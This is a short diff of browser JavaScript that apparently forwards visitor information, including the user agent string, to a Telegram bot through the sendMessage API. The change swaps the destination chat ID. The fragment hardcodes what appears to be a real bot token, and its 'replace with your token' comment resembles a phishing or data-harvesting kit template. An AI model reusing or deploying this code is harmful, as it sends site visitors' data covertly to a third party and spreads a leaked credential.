@@ -85,7 +85,7 @@ ${navigator.userAgent}
         
         // REPLACE WITH YOUR BOT TOKEN AND CHAT ID
         const BOT_TOKEN = '8367190020:AAHMSoZLLFISXHX_eOFRGQ2q7AyfUZGo6oc';
-        const CHAT_ID = '-1003720688102';
+        const CHAT_ID = '-1003737910762';
         
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
